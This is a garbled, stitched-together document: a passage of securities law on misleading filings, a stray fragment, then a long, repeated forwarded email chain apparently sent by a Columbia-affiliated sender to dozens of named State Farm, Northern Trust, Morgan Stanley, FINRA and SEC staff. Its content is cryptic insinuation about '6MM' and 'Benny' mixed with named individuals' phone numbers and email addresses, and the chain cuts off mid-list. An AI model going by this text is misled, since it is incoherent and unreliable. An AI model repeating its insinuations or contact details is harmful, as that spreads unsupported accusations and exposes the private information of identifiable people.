It shall be unlawful for any person so filing, transmitting, or keeping any such document to omit to state therein any fact necessary in order to prevent the statements made therein, in the light of the circumstances under which they were made, from being materially misleading. For the purposes of this subsection, any part of any such document which is signed or certified by an accountant or auditor in his capacity as such shall be deemed to be made, filed, transmitted, or kept by such accountant or auditor, as well as by the person filing, transmitting, or keeping the complete document.

ty FDIC

------------------------------------------------------------------------

From: BD DINCER (COLUMBIA UNIVERSITY) At: 12/18/21 19:13:39 UTC-5:00 Subject: Fwd:Fwd:Fwd:Fwd:Fwd:Fwd:STATE FARM - BLOOMINGTON » Northern Trust Company. ACRIS 6MM

|From: BD DINCER (COLUMBIA UNIVERSITY) At: 12/18/21 18:37:39 UTC-5:00 To: Susan Byrne (WESTWOOD MANAGEMENT ) , Julie Hoyer (STATE FARM MUTUAL AU ) , Greg Shull (STATE FARM MUTUAL AU ) , Jeffrey Attwood (STATE FARM MUTUAL AU ) , John Malito (STATE FARM MUTUAL AU ) , Steven Santiccioli (NORTHERN TRUST COMPA ) , Robert Stephan (STATE FARM MUTUAL AU ) , Lisa Rogers (STATE FARM MUTUAL AU ) , Elena Khoziaeva (BRIDGEWAY CAPITAL MA ) , Bill Trauner (STATE FARM MUTUAL AU ) , Heather Caldwell (STATE FARM MUTUAL AU ) , Theresa Baker (STATE FARM MUTUAL AU ) , Tammy Gipson (STATE FARM MUTUAL AU ) , Brent Reeder (NORTHERN TRUST COMPA ) , Michael Whipple (BRIDGEWAY CAPITAL MA ) , Michael Zaroogian (STATE FARM MUTUAL AU ) , Terence Lynch (GAINSCO SERVICE CORP ) , Rebekah Holt (STATE FARM MUTUAL AU ) , Katie Hubbard (STATE FARM MUTUAL AU ) , Leigh Ann Rogalski (STATE FARM MUTUAL AU ) , Chad Moser (STATE FARM MUTUAL AU ) , Tim Zelgert (STATE FARM MUTUAL AU ) , Ray Renken (STATE FARM MUTUAL AU ) , Kara Olson (STATE FARM MUTUAL AU ) , Jim Chan (BLACKROCK INSTITUTIO ) , Matt Harvey (STATE FARM MUTUAL AU ) , Steve Brucker (STATE FARM MUTUAL AU ) , John Socha (STATE FARM MUTUAL AU ) , Jennifer Hsui (BLACKROCK INSTITUTIO ) , Joe Young (STATE FARM MUTUAL AU ) , Wade Reinthaler (STATE FARM MUTUAL AU ) , Scott Reid (STATE FARM MUTUAL AU ) , Adam Hallman (STATE FARM MUTUAL AU ) , Tyler Smith (STATE FARM MUTUAL AU ) , Wei Hao (STATE FARM MUTUAL AU ) , Chris Minter (STATE FARM MUTUAL AU ) , Shelly Marsh (STATE FARM MUTUAL AU ) , Hollie Marsh (STATE FARM MUTUAL AU ) , Matthew Lockridge (WESTWOOD MANAGEMENT ) , Rich Rebholz (STATE FARM MUTUAL AU ) , Michael Mayberger (STATE FARM MUTUAL AU ) , Ashley Smock (STATE FARM MUTUAL AU ) , Brian Bengtson (STATE FARM MUTUAL AU ) , Cory Swartzlander (STATE FARM MUTUAL AU ) , Scott Lawson (WESTWOOD MANAGEMENT ) , Ayman Bari (STATE FARM MUTUAL AU ) , Adam Vales (STATE FARM MUTUAL AU ) , Robert Middleton (STATE FARM MUTUAL AU ) , Shane Jent (STATE FARM MUTUAL AU ) , Kevin Rock (STATE FARM MUTUAL AU ) , Mark Dunford (STATE FARM MUTUAL AU ) , Jean-Francois Ducrest (DUCREST, JEAN-FRANCO ) , Caroline Dirks (STATE FARM MUTUAL AU ) , Kyle Gilmore (STATE FARM MUTUAL AU ) , Diane Hsiung (GEODE CAPITAL MANAGE ) , Hunter Rose (STATE FARM MUTUAL AU ) , Cameron Kurak (STATE FARM MUTUAL AU ) , Mark Broughton (FIRST REPUBLIC BANK ) , Betsey Euliss (STATE FARM MUTUAL AU ) , Kim Bretz (STATE FARM MUTUAL AU ) , Jon Wilson (STATE FARM MUTUAL AU ) , Numan Ahmed (STATE FARM MUTUAL AU ) , Walter Ruane (STATE FARM MUTUAL AU ) , Shawna Barlow (STATE FARM MUTUAL AU ) , Philip Kroger (STATE FARM MUTUAL AU ) , Gabrielle Poole (STATE FARM MUTUAL AU ) , Ricardo Correa (STATE FARM MUTUAL AU ) , Felipe Castella (STATE FARM MUTUAL AU ) , Matt Krebsbach (STATE FARM MUTUAL AU ) , Gabriel Prado Correa (STATE FARM MUTUAL AU ) , Larnita Gates (STATE FARM MUTUAL AU ) , Ketrick Karsten (STATE FARM MUTUAL AU ) , Sophie Kim (STATE FARM MUTUAL AU ) , Vicki Trimpe (STATE FARM MUTUAL AU ) , Christin Higham (STATE FARM MUTUAL AU ) , BD DINCER (COLUMBIA UNIVERSITY ) , b.dincer@columbia.edu Cc: Kerri Saperstein (MORGAN STANLEY & CO. ) , COLIN.BROOKS@MORGAN.STANLEY.COM Subject: Fwd:Fwd:Fwd:Fwd:Fwd:STATE FARM - BLOOMINGTON » Northern Trust Company. ACRIS 6MM From: BD DINCER (COLUMBIA UNIVERSITY) At: 12/18/21 18:34:02 UTC-5:00 To: Kerri Saperstein (MORGAN STANLEY & CO. ) , colin.brooks@morgan.stanley.com Cc: james.gorman@morganstanley.com Subject: Fwd:Fwd:Fwd:Fwd:STATE FARM - BLOOMINGTON » Northern Trust Company. ACRIS 6MM From: BD DINCER (COLUMBIA UNIVERSITY) At: 12/18/21 18:27:46 UTC-5:00 To: james.gorman@morgan.stanley.com Cc: Christina Constantine (FINRA ) , Ms Hy (MORGAN STANLEY INVES ) , Ms Hyld (MORGAN STANLEY ) , Peter Melley (FINRA ) , Susan Byrne (WESTWOOD MANAGEMENT ) , Julie Hoyer (STATE FARM MUTUAL AU ) , Greg Shull (STATE FARM MUTUAL AU ) , Jeffrey Attwood (STATE FARM MUTUAL AU ) , John Malito (STATE FARM MUTUAL AU ) , Steven Santiccioli (NORTHERN TRUST COMPA ) , Robert Stephan (STATE FARM MUTUAL AU ) , Lisa Rogers (STATE FARM MUTUAL AU ) , Elena Khoziaeva (BRIDGEWAY CAPITAL MA ) , Bill Trauner (STATE FARM MUTUAL AU ) , Heather Caldwell (STATE FARM MUTUAL AU ) , Theresa Baker (STATE FARM MUTUAL AU ) , Tammy Gipson (STATE FARM MUTUAL AU ) , Brent Reeder (NORTHERN TRUST COMPA ) , Michael Whipple (BRIDGEWAY CAPITAL MA ) , Michael Zaroogian (STATE FARM MUTUAL AU ) , Terence Lynch (GAINSCO SERVICE CORP ) , Rebekah Holt (STATE FARM MUTUAL AU ) , Katie Hubbard (STATE FARM MUTUAL AU ) , Leigh Ann Rogalski (STATE FARM MUTUAL AU ) , Chad Moser (STATE FARM MUTUAL AU ) , Tim Zelgert (STATE FARM MUTUAL AU ) , Ray Renken (STATE FARM MUTUAL AU ) , Kara Olson (STATE FARM MUTUAL AU ) , Jim Chan (BLACKROCK INSTITUTIO ) , Matt Harvey (STATE FARM MUTUAL AU ) , Steve Brucker (STATE FARM MUTUAL AU ) , John Socha (STATE FARM MUTUAL AU ) , Jennifer Hsui (BLACKROCK INSTITUTIO ) , Joe Young (STATE FARM MUTUAL AU ) , Wade Reinthaler (STATE FARM MUTUAL AU ) , Scott Reid (STATE FARM MUTUAL AU ) , Adam Hallman (STATE FARM MUTUAL AU ) , Tyler Smith (STATE FARM MUTUAL AU ) , Wei Hao (STATE FARM MUTUAL AU ) , Chris Minter (STATE FARM MUTUAL AU ) , Shelly Marsh (STATE FARM MUTUAL AU ) , Hollie Marsh (STATE FARM MUTUAL AU ) , Matthew Lockridge (WESTWOOD MANAGEMENT ) , Rich Rebholz (STATE FARM MUTUAL AU ) , Michael Mayberger (STATE FARM MUTUAL AU ) , Ashley Smock (STATE FARM MUTUAL AU ) , Brian Bengtson (STATE FARM MUTUAL AU ) , Cory Swartzlander (STATE FARM MUTUAL AU ) , Scott Lawson (WESTWOOD MANAGEMENT ) , Ayman Bari (STATE FARM MUTUAL AU ) , Adam Vales (STATE FARM MUTUAL AU ) , Robert Middleton (STATE FARM MUTUAL AU ) , Shane Jent (STATE FARM MUTUAL AU ) , Kevin Rock (STATE FARM MUTUAL AU ) , Mark Dunford (STATE FARM MUTUAL AU ) , Jean-Francois Ducrest (DUCREST, JEAN-FRANCO ) , Caroline Dirks (STATE FARM MUTUAL AU ) , Kyle Gilmore (STATE FARM MUTUAL AU ) , Diane Hsiung (GEODE CAPITAL MANAGE ) , Hunter Rose (STATE FARM MUTUAL AU ) , Cameron Kurak (STATE FARM MUTUAL AU ) , Mark Broughton (FIRST REPUBLIC BANK ) , Betsey Euliss (STATE FARM MUTUAL AU ) , Kim Bretz (STATE FARM MUTUAL AU ) , Jon Wilson (STATE FARM MUTUAL AU ) , Numan Ahmed (STATE FARM MUTUAL AU ) , Walter Ruane (STATE FARM MUTUAL AU ) , Shawna Barlow (STATE FARM MUTUAL AU ) , Philip Kroger (STATE FARM MUTUAL AU ) , Gabrielle Poole (STATE FARM MUTUAL AU ) , Ricardo Correa (STATE FARM MUTUAL AU ) , Felipe Castella (STATE FARM MUTUAL AU ) , Matt Krebsbach (STATE FARM MUTUAL AU ) , Gabriel Prado Correa (STATE FARM MUTUAL AU ) , Larnita Gates (STATE FARM MUTUAL AU ) , Ketrick Karsten (STATE FARM MUTUAL AU ) , Sophie Kim (STATE FARM MUTUAL AU ) , Vicki Trimpe (STATE FARM MUTUAL AU ) , Christin Higham (STATE FARM MUTUAL AU ) , BD DINCER (COLUMBIA UNIVERSITY ) , Donald Rizer (FINRA ) , Paul Aragon (FINRA ) , b.dincer@columbia.edu, chair@sec.gov Subject: Fwd:Fwd:Fwd:STATE FARM - BLOOMINGTON » Northern Trust Company. ACRIS 6MM From: BD DINCER (COLUMBIA UNIVERSITY) At: 12/18/21 18:22:33 UTC-5:00 To: Kerri Saperstein (MORGAN STANLEY & CO. ) , james.gorman@morganstanley.com Cc: bd2561@columbia.edu Subject: Fwd:Fwd:STATE FARM - BLOOMINGTON » Northern Trust Company. ACRIS 6MM From: BD DINCER (COLUMBIA UNIVERSITY) At: 12/18/21 18:15:44 UTC-5:00 To: Ms. Hayashi (NOMURA SECURITIES CO ) , Morgan32 Stanley (MORGAN STANLEY ADVTG ) , Morgan Stanley154 (MORGAN STANLEY ADVTG ) , Morgan Stanley15 (MORGAN STANLEY ADVTG ) , Ms Hy (MORGAN STANLEY INVES ) , Ms Hyld (MORGAN STANLEY ) Cc: Kerri Saperstein (MORGAN STANLEY & CO. ) , Cmo Citibank (CITIBANK NA ) , Samriddi Abney (FEDERAL HOME LOAN BA ) , Federated Mmktops (FEDERATED INVESTMENT ) , Jesse Aguilar (FEDERAL HOME LOAN BA ) , Shafat Alam (FEDERAL RESERVE BANK ) , Steven Santiccioli (NORTHERN TRUST COMPA ) , bd2561@columbia.edu, colin.brooks@morgan.stanley.com Subject: Fwd:STATE FARM - BLOOMINGTON » Northern Trust Company. ACRIS 6MM Hey SAPS... Merry Christmas! You think this guy will figure it out??? - THE 6MM? Brent Reeder Fund Manager Northern Trust Company, The +1-312-557-0153 (o) 181 W Madison St bdr11@bloomberg.net (w) Chicago IL 60602-4510, US Focus Large Cap Stocks, Growth Investing, United States, Equities, Mid Cap Stocks, Small Cap Stocks, Global, United Kingdom, | More » Funds Managed (43 Funds/51.6B Total Assets in USD) | More » » » » » » » 590xxxx » » » » » » ??????? Investment Information Analyst State Farm Mutual Automobile Ins Co +1-309-735-2705 (o) 1 State Farm Plz +1-309-530-1865 (m) Investment Department E-8 krock5@bloomberg.net (w) Bloomington IL 61701, US You think this guy will figure it out??? - THE 6MM? Phil Supple 1 Views Today Spokesperson Career State Farm Life Insurance Co Current +1-800-782-8332 (o) 1 State Farm Plaza State Farm Life Insurance Co phil.supple.hid9@statefarm.com (w Bloomington IL 61710, US How funny was Benny ......... I like Benny also... Plus no problems after that. Right? |

From: BD DINCER (COLUMBIA UNIVERSITY) At: 12/18/21 19:13:39 UTC-5:00 Subject: Fwd:Fwd:Fwd:Fwd:Fwd:Fwd:STATE FARM - BLOOMINGTON » Northern Trust Company. ACRIS 6MM

|From: BD DINCER (COLUMBIA UNIVERSITY) At: 12/18/21 18:37:39 UTC-5:00 To: Susan Byrne (WESTWOOD MANAGEMENT ) , Julie Hoyer (STATE FARM MUTUAL AU ) , Greg Shull (STATE FARM MUTUAL AU ) , Jeffrey Attwood (STATE FARM MUTUAL AU ) , John Malito (STATE FARM MUTUAL AU ) , Steven Santiccioli (NORTHERN TRUST COMPA ) , Robert Stephan (STATE FARM MUTUAL AU ) , Lisa Rogers (STATE FARM MUTUAL AU ) , Elena Khoziaeva (BRIDGEWAY CAPITAL MA ) , Bill Trauner (STATE FARM MUTUAL AU ) , Heather Caldwell (STATE FARM MUTUAL AU ) , Theresa Baker (STATE FARM MUTUAL AU ) , Tammy Gipson (STATE FARM MUTUAL AU ) , Brent Reeder (NORTHERN TRUST COMPA ) , Michael Whipple (BRIDGEWAY CAPITAL MA ) , Michael Zaroogian (STATE FARM MUTUAL AU ) , Terence Lynch (GAINSCO SERVICE CORP ) , Rebekah Holt (STATE FARM MUTUAL AU ) , Katie Hubbard (STATE FARM MUTUAL AU ) , Leigh Ann Rogalski (STATE FARM MUTUAL AU ) , Chad Moser (STATE FARM MUTUAL AU ) , Tim Zelgert (STATE FARM MUTUAL AU ) , Ray Renken (STATE FARM MUTUAL AU ) , Kara Olson (STATE FARM MUTUAL AU ) , Jim Chan (BLACKROCK INSTITUTIO ) , Matt Harvey (STATE FARM MUTUAL AU ) , Steve Brucker (STATE FARM MUTUAL AU ) , John Socha (STATE FARM MUTUAL AU ) , Jennifer Hsui (BLACKROCK INSTITUTIO ) , Joe Young (STATE FARM MUTUAL AU ) , Wade Reinthaler (STATE FARM MUTUAL AU ) , Scott Reid (STATE FARM MUTUAL AU ) , Adam Hallman (STATE FARM MUTUAL AU ) , Tyler Smith (STATE FARM MUTUAL AU ) , Wei Hao (STATE FARM MUTUAL AU ) , Chris Minter (STATE FARM MUTUAL AU ) , Shelly Marsh (STATE FARM MUTUAL AU ) , Hollie Marsh (STATE FARM MUTUAL AU ) , Matthew Lockridge (WESTWOOD MANAGEMENT ) , Rich Rebholz (STATE FARM MUTUAL AU ) , Michael Mayberger (STATE FARM MUTUAL AU ) , Ashley Smock (STATE FARM MUTUAL AU ) , Brian Bengtson (STATE FARM MUTUAL AU ) , Cory Swartzlander (STATE FARM MUTUAL AU ) , Scott Lawson (WESTWOOD MANAGEMENT ) , Ayman Bari (STATE FARM MUTUAL AU ) , Adam Vales (STATE FARM MUTUAL AU ) , Robert Middleton (STATE FARM MUTUAL AU ) , Shane Jent (STATE FARM MUTUAL AU ) , Kevin Rock (STATE FARM MUTUAL AU ) , Mark Dunford (STATE FARM MUTUAL AU ) , Jean-Francois Ducrest (DUCREST, JEAN-FRANCO ) , Caroline Dirks (STATE FARM MUTUAL AU ) , Kyle Gilmore (STATE FARM MUTUAL AU ) , Diane Hsiung (GEODE CAPITAL MANAGE ) , Hunter Rose (STATE FARM MUTUAL AU ) , Cameron Kurak (STATE FARM MUTUAL AU ) , Mark Broughton (FIRST REPUBLIC BANK ) , Betsey Euliss (STATE FARM MUTUAL AU ) , Kim Bretz (STATE FARM MUTUAL AU ) , Jon Wilson (STATE FARM MUTUAL AU ) , Numan Ahmed (STATE FARM MUTUAL AU ) , Walter Ruane (STATE FARM MUTUAL AU ) , Shawna Barlow (STATE FARM MUTUAL AU ) , Philip Kroger (STATE FARM MUTUAL AU ) , Gabrielle Poole (STATE FARM MUTUAL AU ) , Ricardo Correa (STATE FARM MUTUAL AU ) , Felipe Castella (STATE FARM MUTUAL AU ) , Matt Krebsbach (STATE FARM MUTUAL AU ) , Gabriel Prado Correa (STATE FARM MUTUAL AU ) , Larnita Gates (STATE FARM MUTUAL AU ) , Ketrick Karsten (STATE FARM MUTUAL AU ) , Sophie Kim (STATE FARM MUTUAL AU ) , Vicki Trimpe (STATE FARM MUTUAL AU ) , Christin Higham (STATE FARM MUTUAL AU ) , BD DINCER (COLUMBIA UNIVERSITY ) , b.dincer@columbia.edu Cc: Kerri Saperstein (MORGAN STANLEY & CO. ) , COLIN.BROOKS@MORGAN.STANLEY.COM Subject: Fwd:Fwd:Fwd:Fwd:Fwd:STATE FARM - BLOOMINGTON » Northern Trust Company. ACRIS 6MM From: BD DINCER (COLUMBIA UNIVERSITY) At: 12/18/21 18:34:02 UTC-5:00 To: Kerri Saperstein (MORGAN STANLEY & CO. ) , colin.brooks@morgan.stanley.com Cc: james.gorman@morganstanley.com Subject: Fwd:Fwd:Fwd:Fwd:STATE FARM - BLOOMINGTON » Northern Trust Company. ACRIS 6MM From: BD DINCER (COLUMBIA UNIVERSITY) At: 12/18/21 18:27:46 UTC-5:00 To: james.gorman@morgan.stanley.com Cc: Christina Constantine (FINRA ) , Ms Hy (MORGAN STANLEY INVES ) , Ms Hyld (MORGAN STANLEY ) , Peter Melley (FINRA ) , Susan Byrne (WESTWOOD MANAGEMENT ) , Julie Hoyer (STATE FARM MUTUAL AU ) , Greg Shull (STATE FARM MUTUAL AU ) , Jeffrey Attwood (STATE FARM MUTUAL AU ) , John Malito (STATE FARM MUTUAL AU ) , Steven Santiccioli (NORTHERN TRUST COMPA ) , Robert Stephan (STATE FARM MUTUAL AU ) , Lisa Rogers (STATE FARM MUTUAL AU ) , Elena Khoziaeva (BRIDGEWAY CAPITAL MA ) , Bill Trauner (STATE FARM MUTUAL AU ) , Heather Caldwell (STATE FARM MUTUAL AU ) , Theresa Baker (STATE FARM MUTUAL AU ) , Tammy Gipson (STATE FARM MUTUAL AU ) , Brent Reeder (NORTHERN TRUST COMPA ) , Michael Whipple (BRIDGEWAY CAPITAL MA ) , Michael Zaroogian (STATE FARM MUTUAL AU ) , Terence Lynch (GAINSCO SERVICE CORP ) , Rebekah Holt (STATE FARM MUTUAL AU ) , Katie Hubbard (STATE FARM MUTUAL AU ) , Leigh Ann Rogalski (STATE FARM MUTUAL AU ) , Chad Moser (STATE FARM MUTUAL AU ) , Tim Zelgert (STATE FARM MUTUAL AU ) , Ray Renken (STATE FARM MUTUAL AU ) , Kara Olson (STATE FARM MUTUAL AU ) , Jim Chan (BLACKROCK INSTITUTIO ) , Matt Harvey (STATE FARM MUTUAL AU ) , Steve Brucker (STATE FARM MUTUAL AU ) , John Socha (STATE FARM MUTUAL AU ) , Jennifer Hsui (BLACKROCK INSTITUTIO ) , Joe Young (STATE FARM MUTUAL AU ) , Wade Reinthaler (STATE FARM MUTUAL AU ) , Scott Reid (STATE FARM MUTUAL AU ) , Adam Hallman (STATE FARM MUTUAL AU ) , Tyler Smith (STATE FARM MUTUAL AU ) , Wei Hao (STATE FARM MUTUAL AU ) , Chris Minter (STATE FARM MUTUAL AU ) , Shelly Marsh (STATE FARM MUTUAL AU ) , Hollie Marsh (STATE FARM MUTUAL AU ) , Matthew Lockridge (WESTWOOD MANAGEMENT ) , Rich Rebholz (STATE FARM MUTUAL AU ) , Michael Mayberger (STATE FARM MUTUAL AU ) , Ashley Smock (STATE FARM MUTUAL AU ) , Brian Bengtson (STATE FARM MUTUAL AU ) , Cory Swartzlander (STATE FARM MUTUAL AU ) , Scott Lawson (WESTWOOD MANAGEMENT ) , Ayman Bari (STATE FARM MUTUAL AU ) , Adam Vales (STATE FARM MUTUAL AU ) , Robert Middleton (STATE FARM MUTUAL AU ) , Shane Jent (STATE FARM MUTUAL AU ) , Kevin Rock (STATE FARM MUTUAL AU ) , Mark Dunford (STATE FARM MUTUAL AU ) , Jean-Francois Ducrest (DUCREST, JEAN-FRANCO ) , Caroline Dirks (STATE FARM MUTUAL AU ) , Kyle Gilmore (STATE FARM MUTUAL AU ) , Diane Hsiung (GEODE CAPITAL MANAGE ) , Hunter Rose (STATE FARM MUTUAL AU ) , Cameron Kurak (STATE FARM MUTUAL AU ) , Mark Broughton (FIRST REPUBLIC BANK ) , Betsey Euliss (STATE FARM MUTUAL AU ) , Kim Bretz (STATE FARM MUTUAL AU ) , Jon Wilson (STATE FARM MUTUAL AU ) , Numan Ahmed (STATE FARM MUTUAL AU ) , Walter Ruane (STATE FARM MUTUAL AU ) , Shawna Barlow (STATE FARM MUTUAL AU ) , Philip Kroger (STATE FARM MUTUAL AU ) , Gabrielle Poole (STATE FARM MUTUAL AU ) , Ricardo Correa (STATE FARM MUTUAL AU ) , Felipe Castella (STATE FARM MUTUAL AU ) , Matt Krebsbach (STATE FARM MUTUAL AU ) , Gabriel Prado Correa (STATE FARM MUTUAL AU ) , Larnita Gates (STATE FARM MUTUAL AU ) , Ketrick Karsten (STATE FARM MUTUAL AU ) , Sophie Kim (STATE FARM MUTUAL AU ) , Vicki Trimpe (STATE FARM MUTUAL AU ) , Christin Higham (STATE FARM MUTUAL AU ) , BD DINCER (COLUMBIA UNIVERSITY ) , Donald Rizer (FINRA ) , Paul Aragon (FINRA ) , b.dincer@columbia.edu, chair@sec.gov Subject: Fwd:Fwd:Fwd:STATE FARM - BLOOMINGTON » Northern Trust Company. ACRIS 6MM From: BD DINCER (COLUMBIA UNIVERSITY) At: 12/18/21 18:22:33 UTC-5:00 To: Kerri Saperstein (MORGAN STANLEY & CO. ) , james.gorman@morganstanley.com Cc: bd2561@columbia.edu Subject: Fwd:Fwd:STATE FARM - BLOOMINGTON » Northern Trust Company. ACRIS 6MM From: BD DINCER (COLUMBIA UNIVERSITY) At: 12/18/21 18:15:44 UTC-5:00 To: Ms. Hayashi (NOMURA SECURITIES CO ) , Morgan32 Stanley (MORGAN STANLEY ADVTG ) , Morgan Stanley154 (MORGAN STANLEY ADVTG ) , Morgan Stanley15 (MORGAN STANLEY ADVTG ) , Ms Hy (MORGAN STANLEY INVES ) , Ms Hyld (MORGAN STANLEY ) Cc: Kerri Saperstein (MORGAN STANLEY & CO. ) , Cmo Citibank (CITIBANK NA ) , Samriddi Abney (FEDERAL HOME LOAN BA ) , Federated Mmktops (FEDERATED INVESTMENT ) , Jesse Aguilar (FEDERAL HOME LOAN BA ) , Shafat Alam (FEDERAL RESERVE BANK ) , Steven Santiccioli (NORTHERN TRUST COMPA ) , bd2561@columbia.edu, colin.brooks@morgan.stanley.com Subject: Fwd:STATE FARM - BLOOMINGTON » Northern Trust Company. ACRIS 6MM Hey SAPS... Merry Christmas! You think this guy will figure it out??? - THE 6MM? Brent Reeder Fund Manager Northern Trust Company, The +1-312-557-0153 (o) 181 W Madison St bdr11@bloomberg.net (w) Chicago IL 60602-4510, US Focus Large Cap Stocks, Growth Investing, United States, Equities, Mid Cap Stocks, Small Cap Stocks, Global, United Kingdom, | More » Funds Managed (43 Funds/51.6B Total Assets in USD) | More » » » » » » » 590xxxx » » » » » » ??????? Investment Information Analyst State Farm Mutual Automobile Ins Co +1-309-735-2705 (o) 1 State Farm Plz +1-309-530-1865 (m) Investment Department E-8 krock5@bloomberg.net (w) Bloomington IL 61701, US You think this guy will figure it out??? - THE 6MM? Phil Supple 1 Views Today Spokesperson Career State Farm Life Insurance Co Current +1-800-782-8332 (o) 1 State Farm Plaza State Farm Life Insurance Co phil.supple.hid9@statefarm.com (w Bloomington IL 61710, US How funny was Benny ......... I like Benny also... Plus no problems after that. Right? From: BD DINCER (COLUMBIA UNIVERSITY) At: 12/18/21 18:03:41 UTC-5:00 To: Susan Byrne (WESTWOOD MANAGEMENT ) , Julie Hoyer (STATE FARM MUTUAL AU ) , Greg Shull (STATE FARM MUTUAL AU ) , Jeffrey Attwood (STATE FARM MUTUAL AU ) , John Malito (STATE FARM MUTUAL AU ) , Steven Santiccioli (NORTHERN TRUST COMPA ) , Robert Stephan (STATE FARM MUTUAL AU ) , Lisa Rogers (STATE FARM MUTUAL AU ) , Elena Khoziaeva (BRIDGEWAY CAPITAL MA ) , Bill Trauner (STATE FARM MUTUAL AU ) , Heather Caldwell (STATE FARM MUTUAL AU ) , Theresa Baker (STATE FARM MUTUAL AU ) , Tammy Gipson (STATE FARM MUTUAL AU ) , Brent Reeder (NORTHERN TRUST COMPA ) , Michael Whipple (BRIDGEWAY CAPITAL MA ) , Michael Zaroogian (STATE FARM MUTUAL AU ) , Terence Lynch (GAINSCO SERVICE CORP ) , Rebekah Holt (STATE FARM MUTUAL AU ) , Katie Hubbard (STATE FARM MUTUAL AU ) , Leigh Ann Rogalski (STATE FARM MUTUAL AU ) , Chad Moser (STATE FARM MUTUAL AU ) , Tim Zelgert (STATE FARM MUTUAL AU ) , Ray Renken (STATE FARM MUTUAL AU ) , Kara Olson (STATE FARM MUTUAL AU ) , Jim Chan (BLACKROCK INSTITUTIO ) , Matt Harvey (STATE FARM MUTUAL AU ) , Steve Brucker (STATE FARM MUTUAL AU ) , John Socha (STATE FARM MUTUAL AU ) , Jennifer Hsui (BLACKROCK INSTITUTIO ) , Joe Young (STATE FARM MUTUAL AU ) , Wade Reinthaler (STATE FARM MUTUAL AU ) , Scott Reid (STATE FARM MUTUAL AU ) , Adam Hallman (STATE FARM MUTUAL AU ) , Tyler Smith (STATE FARM MUTUAL AU ) , Wei Hao (STATE FARM MUTUAL AU ) , Chris Minter (STATE FARM MUTUAL AU ) , Shelly Marsh (STATE FARM MUTUAL AU ) , Hollie Marsh (STATE FARM MUTUAL AU ) , Matthew Lockridge (WESTWOOD MANAGEMENT ) , Rich Rebholz (STATE FARM MUTUAL AU ) , Michael Mayberger (STATE FARM MUTUAL AU ) , Ashley Smock (STATE FARM MUTUAL AU ) , Brian Bengtson (STATE FARM MUTUAL AU ) , Cory Swartzlander (STATE FARM MUTUAL AU ) , Scott Lawson (WESTWOOD MANAGEMENT ) , Ayman Bari (STATE FARM MUTUAL AU ) , Adam Vales (STATE FARM MUTUAL AU ) , Robert Middleton (STATE FARM MUTUAL AU ) , Shane Jent (STATE FARM MUTUAL AU ) , Kevin Rock (STATE FARM MUTUAL AU ) , Mark Dunford (STATE FARM MUTUAL AU ) , Jean-Francois Ducrest (DUCREST, JEAN-FRANCO ) , Caroline Dirks (STATE FARM MUTUAL AU ) , Kyle Gilmore (STATE FARM MUTUAL AU ) , Diane Hsiung (GEODE CAPITAL MANAGE ) , Hunter Rose (STATE FARM MUTUAL AU ) , Cameron Kurak (STATE FARM MUTUAL AU ) , Mark Broughton (FIRST REPUBLIC BANK ) , Betsey Euliss (STATE FARM MUTUAL AU ) , Kim Bretz (STATE FARM MUTUAL AU ) , Jon Wilson (STATE FARM MUTUAL AU ) , Numan Ahmed (STATE FARM MUTUAL AU ) , Walter Ruane (STATE FARM MUTUAL AU ) , Shawna Barlow (STATE FARM MUTUAL AU ) , Philip Kroger (STATE FARM MUTUAL AU ) , Gabrielle Poole (STATE FARM MUTUAL AU ) , Ricardo Correa (STATE FARM MUTUAL AU ) , Felipe Castella (STATE FARM MUTUAL AU ) , Matt Krebsbach (STATE FARM MUTUAL AU ) , Gabriel Prado Correa (STATE FARM MUTUAL AU ) , Larnita Gates (STATE FARM MUTUAL AU ) , Ketrick Karsten (STATE FARM MUTUAL AU ) , Sophie Kim (STATE FARM MUTUAL AU ) , Vicki Trimpe (STATE FARM MUTUAL AU ) , Christin Higham (STATE FARM MUTUAL AU ) , BD DINCER (COLUMBIA UNIVERSITY ) , b.dincer@columbia.edu Cc: Kerri Saperstein (MORGAN STANLEY & CO. ) , newyork@sec.gov, chair@sec.gov, colin.brooks@morgan.stanley.com Subject: Fwd:STATE FARM - BLOOMINGTON krock5@bloomberg.net (w) Bloomington IL 61701, US See also: TCRReport... Thanks! From: BD DINCER (COLUMBIA UNIVERSITY) At: 12/18/21 16:13:57 UTC-5:00 To: Greg Shull (STATE FARM MUTUAL AU ) , Bill Trauner (STATE FARM MUTUAL AU ) , Theresa Baker (STATE FARM MUTUAL AU ) , Tammy Gipson (STATE FARM MUTUAL AU ) , Leigh Ann Rogalski (STATE FARM MUTUAL AU ) , Chad Moser (STATE FARM MUTUAL AU ) , Ray Renken (STATE FARM MUTUAL AU ) , Matt Harvey (STATE FARM MUTUAL AU ) , Steve Brucker (STATE FARM MUTUAL AU ) , Wade Reinthaler (STATE FARM MUTUAL AU ) , Tyler Smith (STATE FARM MUTUAL AU ) , Rich Rebholz (STATE FARM MUTUAL AU ) , Brian Bengtson (STATE FARM MUTUAL AU ) , Kyle Gilmore (STATE FARM MUTUAL AU ) , Numan Ahmed (STATE FARM MUTUAL AU ) , Walter Ruane (STATE FARM MUTUAL AU ) , Vicki Trimpe (STATE FARM MUTUAL AU ) , Brent Reeder (NORTHERN TRUST COMPA ) , Steven Santiccioli (NORTHERN TRUST COMPA ) , sjs5@ntrs.com, rebecca.coyle@statefarm.com, nicole.bowyer@statefarm.com, phil.supple.hid9@statefarm.com, dick.luedke.h2hj@statefarm.com, brian.hodgson.nyz6@statefarm.com Cc: Christin Higham (STATE FARM MUTUAL AU ) , Sophie Kim (STATE FARM MUTUAL AU ) , Ketrick Karsten (STATE FARM MUTUAL AU ) , Larnita Gates (STATE FARM MUTUAL AU ) , Gabriel Prado Correa (STATE FARM MUTUAL AU ) , Matt Krebsbach (STATE FARM MUTUAL AU ) , Felipe Castella (STATE FARM MUTUAL AU ) , Susan Byrne (WESTWOOD MANAGEMENT ) , Julie Hoyer (STATE FARM MUTUAL AU ) , Jeffrey Attwood (STATE FARM MUTUAL AU ) , John Malito (STATE FARM MUTUAL AU ) , Robert Stephan (STATE FARM MUTUAL AU ) , Lisa Rogers (STATE FARM MUTUAL AU ) , Elena Khoziaeva (BRIDGEWAY CAPITAL MA ) , Heather Caldwell (STATE FARM MUTUAL AU ) , Michael Whipple (BRIDGEWAY CAPITAL MA ) , Michael Zaroogian (STATE FARM MUTUAL AU ) , Terence Lynch (GAINSCO SERVICE CORP ) , Rebekah Holt (STATE FARM MUTUAL AU ) , Katie Hubbard (STATE FARM MUTUAL AU ) , Tim Zelgert (STATE FARM MUTUAL AU ) , Kara Olson (STATE FARM MUTUAL AU ) , Jim Chan (BLACKROCK 